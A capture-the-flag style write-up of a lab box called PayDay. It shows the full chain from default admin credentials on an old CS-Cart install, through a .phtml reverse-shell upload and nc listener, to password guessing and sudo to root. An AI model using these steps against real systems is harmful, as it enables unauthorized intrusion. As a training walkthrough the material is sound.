#Linux #CSCart #DefaultCreds #AuthenticatedRCE #FileUpload #PasswordReuse #Sudo

## Overview

PayDay is a Linux box running a very old CS-Cart e-commerce installation. Default admin credentials open the panel, a file upload bypass in the template editor yields a `www-data` shell, and from there credential hunting in a config file plus classic password reuse chains up to a user with full unrestricted sudo.

## Recon

### Port Scan

```sh
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1
80/tcp  open  http        Apache httpd 2.2.4 (Ubuntu) PHP/5.2.3
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.0.26a
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d
```

The Apache banner and title line name the application:

```
CS-Cart. Powerful PHP shopping cart software
```

### Version Identification

```
http://192.168.180.39/?version  ->  CS-CART: version 1.3.3
```

Searching ExploitDB for this version yields:

**CS-Cart 1.3.3 - Authenticated RCE**
https://www.exploit-db.com/exploits/48891

## Foothold

### Default Credentials

Before running any exploit, try the vendor default. CS-Cart's default admin login worked immediately:

```
admin : admin  ->  http://192.168.180.39/admin.php
```

> **Why defaults persist:** Out-of-the-box admin credentials exist so the first setup isn't locked out. On a system this old (Ubuntu with PHP 5.2 from 2007), the installation was almost certainly never hardened.

### Authenticated RCE via Template File Upload

The RCE technique works through the Look and Feel template editor, which allows file uploads. The bypass is renaming a PHP reverse shell to `.phtml`, a PHP-executable extension that the file type check doesn't block:

1. Log into `/admin.php`
2. Navigate to Look and Feel > Template Editor
3. Upload `php-reverse-shell.php` renamed to `.phtml`
4. Browse to `http://192.168.180.39/skins/<filename>.phtml`

Reverse shell lands as `www-data` on port 53:

```sh
rlwrap nc -lvnp 53
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.39] 48176
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

TTY upgrade:

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### Credential Hunting in Config

LinPEAS surfaces a database password in the CS-Cart config:

```
/var/www/config.php:$db_password = 'root';
═╣ MySQL connection using default root/root ........... Yes
```

A user `patrick` was visible on the system. Given that `admin:admin` worked for the web app, testing `patrick:patrick` as a direct `su` was a reasonable guess:

```sh
www-data@payday:/root$ su patrick
Password: patrick

patrick@payday:/root$ whoami
patrick
```

> **Password reuse in old systems:** On systems this vintage, account passwords frequently mirror the account name or a shared admin password. Always try username-as-password after any foothold.

### Unrestricted Sudo

```sh
User patrick may run the following commands on this host:
    (ALL) ALL
```

Patrick has full, passwordless sudo over everything:

```sh
sudo /bin/bash
root@payday:/root# whoami
root
```

## Root

```sh
root@payday:/root# cat proof.txt
‹redacted›
```

Local flag was also accessible as patrick:

```sh
patrick@payday:~$ cat local.txt
‹redacted›
```

## Takeaways

- **Check default credentials before loading any exploit.** `admin:admin` handed over the entire attack surface here, no CVE needed for the foothold.
- **`.phtml` is a common extension bypass.** Upload filters that block `.php` often miss `.phtml`, `.php5`, `.phar`, and other PHP-executable extensions.
- **Old systems have weak password hygiene.** Trying `username:username` is always worth a quick attempt, especially on systems that have never been audited.
